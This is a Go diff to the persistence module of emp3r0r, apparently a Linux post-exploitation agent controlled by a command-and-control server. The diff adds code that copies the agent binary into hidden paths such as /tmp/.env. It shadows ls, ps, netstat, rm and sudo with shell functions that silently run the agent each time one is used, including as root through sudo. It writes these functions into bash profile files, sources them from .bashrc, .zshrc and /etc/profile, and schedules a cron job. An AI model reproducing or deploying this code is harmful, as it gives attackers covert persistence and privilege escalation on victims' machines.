@@ -2,6 +2,9 @@ package agent
 
 import (
 	"errors"
+	"fmt"
+	"io/ioutil"
+	"log"
 	"os"
 	"os/user"
 	"strings"
@@ -9,19 +12,43 @@ import (
 
 // TODO
 
-// PersistMethods CC calls one of these methods to get persistence, or all of them at once
-var PersistMethods = map[string]func() error{
-	"all":        allInOne,
-	"ld_preload": ldPreload,
-	"profiles":   profiles,
-	"service":    service,
-	"injector":   injector,
-	"task":       task,
-	"patcher":    patcher,
+var (
+	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
+	PersistMethods = map[string]func() error{
+		"ld_preload": ldPreload,
+		"profiles":   profiles,
+		"service":    service,
+		"injector":   injector,
+		"cron":       cronJob,
+		"patcher":    patcher,
+	}
+
+	// EmpLocations all possible locations
+	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", "~/.env", "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}
+
+	// call this to start emp3r0r
+	payload = strings.Join(EmpLocations, ">/dev/null 2>&1 || ") + ">/dev/null 2>&1"
+)
+
+// SelfCopy copy emp3r0r to multiple locations
+func SelfCopy() {
+	for _, path := range EmpLocations {
+		err := Copy(os.Args[0], path)
+		if err != nil {
+			log.Print(err)
+			continue
+		}
+	}
 }
 
-// allInOne called by ccHandler
-func allInOne() (err error) {
+// PersistAllInOne run all persistence method at once
+func PersistAllInOne() (err error) {
+	for k, method := range PersistMethods {
+		e := fmt.Errorf("%s: %v", k, method())
+		if e != nil {
+			err = fmt.Errorf("%v, %v", err, e)
+		}
+	}
 	return
 }
 
@@ -35,13 +62,16 @@ func cronJob() (err error) {
 	if err != nil {
 		return
 	}
-	AddCronJob("*/5 * * * * " + pwd + "/bash")
+	err = AddCronJob("*/5 * * * * " + pwd + "/bash")
 	return
 }
 
 func profiles() (err error) {
 	user, err := user.Current()
 	accountInfo, err := CheckAccount(user.Name)
+
+	// source
+	sourceCmd := "source ~/.bashprofile"
 
 	// nologin users cannot do shit here
 	if strings.Contains(accountInfo["shell"], "nologin") ||
@@ -50,6 +80,40 @@ func profiles() (err error) {
 			return errors.New("This user cannot login")
 		}
 	}
+
+	// loader
+	loader := fmt.Sprintf("ls() { `which ls` $@; (%s) }", payload)
+	loader += fmt.Sprintf("\nping() { `which ping` $@; (%s) }", payload)
+	loader += fmt.Sprintf("\nnetstat() { `which netstat` $@; (%s) }", payload)
+	loader += fmt.Sprintf("\nps() { `which ps` $@; (%s) }", payload)
+	loader += fmt.Sprintf("\nrm() { `which rm` $@; (%s) }", payload)
+
+	// exec our payload as root too!
+	// sudo payload
+	var sudoLocs []string
+	for _, loc := range EmpLocations {
+		sudoLocs = append(sudoLocs, "sudo "+loc+"1>&2 2>/dev/null")
+	}
+	sudoPayload := strings.Join(sudoLocs, "||")
+	loader += fmt.Sprintf("\nsudo() { `which sudo` $@; (%s) }", sudoPayload)
+	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
+	if err != nil {
+		if !IsFileExist(user.HomeDir) {
+			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
+			if err != nil {
+				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
+			}
+			err = AppendToFile("/etc/profile", "source /etc/bash_profile")
+			return fmt.Errorf("This user has no home dir: %v", err)
+		}
+		return
+	}
+
+	// infect all profiles
+	AppendToFile(user.HomeDir+"/.profile", sourceCmd)
+	AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
+	AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
+	AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
 
 	return
 }
@@ -63,10 +127,6 @@ func injector() (err error) {
 }
 
 func service() (err error) {
-	return
-}
-
-func task() (err error) {
 	return
 }
 
